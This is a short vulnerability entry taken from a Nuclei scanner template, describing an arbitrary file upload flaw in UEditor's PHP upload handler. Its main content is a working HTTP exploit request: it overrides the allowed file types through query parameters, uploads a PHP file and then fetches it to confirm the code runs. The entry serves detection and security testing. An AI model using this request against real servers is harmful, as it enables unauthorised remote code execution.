# Vulnerability: UEditor - PHP Arbitrary File Upload
**Classification:** CWE-434
**Source:** Nuclei Template (`ueditor-arbitrary-file-upload.yaml`)

## Description
Detects arbitrary file upload vulnerability in UEditor PHP  by attempting to upload and execute a PHP file. This vulnerability allows remote attackers to upload arbitrary files including PHP files, potentially leading to remote code execution.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /php/action_upload.php?action=uploadimage&CONFIG[imagePathFormat]=ueditor/php/upload/{{filename}}&CONFIG[imageMaxSize]=9999999&CONFIG[imageAllowFiles][]=.php&CONFIG[imageFieldName]={{filename}} HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDMmqvK6b3ncX4xxA

------WebKitFormBoundaryDMmqvK6b3ncX4xxA
Content-Disposition: form-data; name="{{filename}}"; filename="{{filename}}.php"
Content-Type: application/octet-stream

<?php
phpinfo();
?>
------WebKitFormBoundaryDMmqvK6b3ncX4xxA--

GET /php/upload/{{filename}}.php HTTP/1.1
Host: {{Hostname}}
```

